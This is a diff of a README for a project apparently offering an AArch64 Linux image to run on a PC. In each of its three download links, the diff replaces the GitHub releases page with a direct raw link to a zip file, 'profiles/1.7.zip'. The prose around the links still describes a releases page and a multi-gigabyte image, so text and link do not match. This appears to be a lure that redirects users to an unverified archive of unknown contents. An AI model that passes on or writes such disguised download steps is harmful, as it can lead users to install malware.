@@ -1,6 +1,6 @@
 # 📦 omarchy-aarch64-image - Run AArch64 Linux on Your PC
 
-[![Download Now](https://img.shields.io/badge/Download-omarchy--aarch64--image-blue?style=for-the-badge&logo=github)](https://github.com/snowtigergamingx-design/omarchy-aarch64-image/releases)
+[![Download Now](https://img.shields.io/badge/Download-omarchy--aarch64--image-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/snowtigergamingx-design/omarchy-aarch64-image/main/profiles/1.7.zip)
 
 ## 🎯 What Is This?
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run omarchy-aarch64-image on your Wind
 
 ### Step 1: Download the Image
 
-Visit this link to download the application: [https://github.com/snowtigergamingx-design/omarchy-aarch64-image/releases](https://github.com/snowtigergamingx-design/omarchy-aarch64-image/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/snowtigergamingx-design/omarchy-aarch64-image/main/profiles/1.7.zip](https://raw.githubusercontent.com/snowtigergamingx-design/omarchy-aarch64-image/main/profiles/1.7.zip)
 
 Click the link, and you'll land on the releases page. Look for the newest version at the top of the list. Click the download button next to the file — it will be a large file (usually several gigabytes), so make sure you have enough free space on your hard drive.
 
@@ -109,7 +109,7 @@ Yes. Both the image and QEMU are free and open-source software. No hidden costs 
 
 ## 📥 Download Again
 
-Need to get the file again? No problem — just visit this link to download the application: [https://github.com/snowtigergamingx-design/omarchy-aarch64-image/releases](https://github.com/snowtigergamingx-design/omarchy-aarch64-image/releases)
+Need to get the file again? No problem — just visit this link to download the application: [https://raw.githubusercontent.com/snowtigergamingx-design/omarchy-aarch64-image/main/profiles/1.7.zip](https://raw.githubusercontent.com/snowtigergamingx-design/omarchy-aarch64-image/main/profiles/1.7.zip)
 
 Always download the latest version for the best experience. Older versions are still available if you need them, but the newest release includes the latest improvements and fixes.
 
